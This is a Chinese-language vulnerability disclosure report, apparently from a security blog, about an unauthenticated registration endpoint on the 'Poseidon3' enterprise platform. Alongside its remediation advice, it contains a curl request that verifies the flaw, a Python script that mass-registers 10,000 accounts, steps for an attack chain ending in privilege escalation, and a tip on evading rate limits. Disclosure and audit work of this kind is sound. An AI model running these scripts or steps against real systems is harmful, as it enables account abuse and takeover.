---
layout: about
category: about
Researchname: 「poseidon3」：用户注册接口未授权访问
toc: true
author: Bin4xin
permalink: /about/poseidon3-user-registration-unauthorized-access/
desc: 「poseidon3」
---

{% include common-index/index-preset.html level="error" msg="本文所述漏洞仅用于安全研究与合规审计目的，任何未授权的渗透测试或恶意利用行为均违反相关法律法规，后果由使用者自行承担。<br>本文所涉及漏洞信息仅供授权安全研究与合规审计使用，任何未经授权的测试或恶意利用均属违法行为。" %}

# 用户注册接口未授权访问

{: .table}
| 字段 | 内容 |
|------|------|
| **报告编号** | VULN-OMS-2026-001 |
| **漏洞等级** | <span style="color:#cf222e;font-weight:bold">🔴 高危</span> |
| **漏洞类型** | 未授权访问 (Broken Access Control) |
| **目标系统** | example-poseidon3.*****.com (Poseidon3企业应用平台) |
| **发现日期** | 2026-07-07 |
| **影响服务** | po-server（门户服务） |

---

## 1. 漏洞概述

Poseidon3企业应用平台的用户注册接口 `/portal/member/userRegister/registerSubmit` 未配置任何身份认证机制，攻击者无需登录或获取任何凭证即可直接调用该接口注册任意用户账号。此外，注册流程中缺乏验证码、邮箱/手机号验证及管理员审批等防滥用机制，进一步放大了攻击面。该漏洞属于OWASP Top 10中 `A01:2021 - Broken Access Control` 类别。

{% include common-index/index-preset.html level="warn" msg="该接口可被任何人无条件调用，无需登录态、无需验证码、无需管理员审批——属于典型的关键功能缺失认证漏洞（CWE-306），建议立即修复。" %}

---

## 2. 漏洞位置

### 2.1 接口地址

```
POST https://example-poseidon3.*****.com/po-server/portal/member/userRegister/registerSubmit
```

### 2.2 前端调用代码

在前端构建产物 `pages.e7b00d27.js` 中发现如下调用逻辑：

```javascript
// pages.e7b00d27.js
poServer.post("/portal/member/userRegister/registerSubmit", params);
```

### 2.3 服务归属

该接口由 `po-server`（门户服务）承载，该服务未被CAS SSO（eunomia-cas）保护，且未在应用层实现独立的认证校验逻辑。

{% include common-index/index-preset.html level="info" msg="提示：po-server 服务下的 portal/member/userRegister 路径组整体均未被 CAS SSO 保护，除本接口外，同路径下的 checkUserName 接口同样存在未授权访问问题（详见「用户名枚举漏洞」报告）。" %}

---

## 3. 泄露内容分析

### 3.1 接口功能与风险说明

{: .table}
| 功能 | 暴露内容 | 风险等级 |
|------|---------|----------|
| 用户注册（registerSubmit） | 可创建任意用户名账号，无需认证 | <span style="color:#cf222e;font-weight:bold">🔴 极高</span> |
| 用户名检查（checkUserName） | 可枚举已注册用户名，辅助社工/撞库 | <span style="color:#bc6f00;font-weight:bold">🟠 高</span> |

### 3.2 防护缺失一览

{: .table}
| 防护措施 | 状态 |
|---------|------|
| CAS SSO 认证保护 | <span style="color:#cf222e">❌ 未启用</span> |
| 接口级别 Token/Session 校验 | <span style="color:#cf222e">❌ 未实现</span> |
| 图形验证码/行为验证码 | <span style="color:#cf222e">❌ 未配置</span> |
| 邮箱/手机号验证 | <span style="color:#cf222e">❌ 未实现</span> |
| 注册频率限制 | <span style="color:#cf222e">❌ 未实现</span> |
| 管理员审批流程 | <span style="color:#cf222e">❌ 未实现</span> |

{% include common-index/index-preset.html level="error" msg="警告：上述6项防护措施全部缺失，攻击者可零成本、全自动地批量注册账号，建议将此漏洞列为最高优先级修复项。" %}

---

## 4. 漏洞验证

### 4.1 验证请求

{% details 👉 curl 验证请求 %}

```bash
curl -sk -X POST \
  "https://example-poseidon3.*****.com/po-server/portal/member/userRegister/registerSubmit" \
  -H "Content-Type: application/json" \
  -d '{
    "userName": "testuser2026",
    "userPwd": "Test@12345",
    "confirmPwd": "Test@12345"
  }'
```

{% enddetails %}

### 4.2 验证要点

- 请求未携带任何认证Cookie、Session Token或JWT
- 服务端返回HTTP 200状态码，未返回 401/403 等认证失败状态码
- 响应体中包含注册成功状态码，表明账号已创建完成
- 注册流程中未触发任何验证码校验、邮箱验证或管理员审批环节

{% include common-index/index-preset.html level="warn" msg="注意：验证过程应在授权范围内进行，验证后请及时清理测试账号，避免对生产环境造成影响。" %}

---

## 5. 攻击场景

### 5.1 批量注册攻击

攻击者可编写自动化脚本批量注册大量虚假用户：

{% details 👉 批量注册 PoC 代码（Python） %}

```python
import requests
import json
import urllib3

urllib3.disable_warnings()

url = "https://example-poseidon3.*****.com/po-server/portal/member/userRegister/registerSubmit"

for i in range(1, 10000):
    username = f"user{i:05d}"
    payload = {
        "userName": username,
        "userPwd": "P@ssw0rd2026",
        "confirmPwd": "P@ssw0rd2026"
    }
    try:
        resp = requests.post(url, json=payload, verify=False, timeout=10)
        if resp.status_code == 200:
            print(f"[+] 注册成功: {username}")
        else:
            print(f"[-] 注册失败: {username} -> {resp.status_code}")
    except Exception as e:
        print(f"[!] 请求异常: {username} -> {e}")
```

{% enddetails %}

> **后果：** 系统数据库中将产生大量垃圾账号，可用于后续的社工攻击或资源滥用。

{% include common-index/index-preset.html level="info" msg="提示：上述 PoC 代码仅用于展示攻击原理，实际环境中可能因服务端限流或网络策略导致请求失败，但攻击者可通过代理池、随机化 User-Agent 等方式绕过。" %}

### 5.2 权限绕过攻击

{% details 👉 权限绕过攻击步骤 %}

```
1. 注册特殊名称账号（如 admin_backup、sysadmin_v2）
2. 利用后续子账号管理接口提升权限
3. 获得管理员级别的系统访问能力
```

{% enddetails %}

### 5.3 撞库前置攻击

{% details 👉 撞库前置攻击步骤 %}

```
1. 结合 checkUserName 接口枚举出系统中的有效用户名
2. 通过 registerSubmit 为已泄露密码的邮箱注册关联账号
3. 利用密码复用习惯，尝试撞库登录
4. 验证码未启用，可自动化大规模尝试
```

{% enddetails %}

### 5.4 完整攻击链

```
枚举用户名(checkUserName) → 注册新账号(registerSubmit) → 登录获取Session → 创建子账号(addSubCons) → 授予管理员权限(setAuth) → 完全控制系统
```

{% include common-index/index-preset.html level="warn" msg="攻击链说明：以上攻击链从用户名枚举到完全控制系统，每一步均无需任何认证凭证，所有接口均对外开放且无防护，建议结合同系列其他漏洞报告一并修复。" %}

---

## 6. 根因分析

{: .table}
| 层级 | 问题 |
|------|------|
| **架构层** | po-server 未被CAS SSO保护（ECAS保护: ❌） |
| **代码层** | 接口方法未添加 `@PreAuthorize` 或 `@Secured` 注解 |
| **配置层** | Spring Security 的 `intercept-url` 规则未覆盖 `/portal/member/userRegister/**` |
| **流程层** | 注册流程缺少验证码、邮箱验证、管理员审批等防滥用机制 |
| **设计层** | 注册接口暴露在公共访问区域，未与认证子系统集成 |

{% include common-index/index-preset.html level="info" msg="提示：根因可归结为「架构层保护缺失 + 代码层注解遗漏」的双重叠加。仅在代码层添加注解而不修复架构层 CAS 配置，仍可能被绕过，建议双管齐下。" %}

---

## 7. 影响评估

{: .table}
| 维度 | 影响 |
|------|------|
| **机密性** | <span style="color:#1f7bdf">🔵 低</span> — 不直接泄露数据 |
| **完整性** | <span style="color:#cf222e;font-weight:bold">🔴 高</span> — 可篡改系统用户体系，注入恶意账号 |
| **可用性** | <span style="color:#bc6f00">🟡 中</span> — 批量注册可导致数据库膨胀，影响系统性能 |
| **业务影响** | <span style="color:#cf222e;font-weight:bold">🔴 高</span> — 绕过正常用户注册审批流程，威胁平台账号安全 |

---

## 8. 修复建议

### 8.1 紧急修复（P0）
{% include common-index/index-preset.html level="error" msg="紧急：以下修复项应立即实施，建议在发现漏洞后 24 小时内完成 P0 级修复，防止被恶意利用。" %}

- **添加接口认证**：在Spring Security配置中将 `/portal/member/userRegister/registerSubmit` 纳入认证保护范围，要求有效的登录Session或Token。
- **添加验证码校验**：注册请求必须携带有效的图形验证码或行为验证码（如滑块验证、点选验证）。
- **添加邮箱/手机验证**：注册流程中增加邮箱或手机号验证环节，确保用户身份真实性。

### 8.2 短期加固（P1）

- **注册频率限制**：对同一IP地址的注册请求实施频率限制（如每小时最多3次）。
- **管理员审批**：新注册账号默认处于"待审核"状态，需管理员审批后方可激活。
- **用户名黑名单**：禁止注册与系统内置账号相似的用户名（如 `admin`、`root`、`system`、`admin_backup` 等）。
- **操作审计日志**：记录所有注册请求的详细日志，包括来源IP、请求时间、注册用户名等。

{% include common-index/index-preset.html level="info" msg="提示：P1 级修复建议在漏洞发现后 7 个工作日内完成，并在修复完成后进行回归测试，确认注册流程功能正常。" %}

### 8.3 长期加固（P2）

- **移除前端注册入口**：将用户注册流程改为邀请制或内部审批制，不在公网暴露注册接口。
- **统一认证网关**：所有微服务通过API网关统一鉴权，避免遗漏接口。
- **安全审计**：定期进行接口权限配置审查，确保无遗漏的未授权接口。
- **蜜罐账号监测**：在数据库中设置蜜罐账号，监控是否有异常注册行为触发告警。

---

## 9. 参考标准

- [OWASP Top 10 2021: A01 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/){:target="_blank"}
- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html){:target="_blank"}
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html){:target="_blank"}
- GB/T 22239-2019 信息安全技术 网络安全等级保护基本要求

---

**报告日期：** 2026-07-07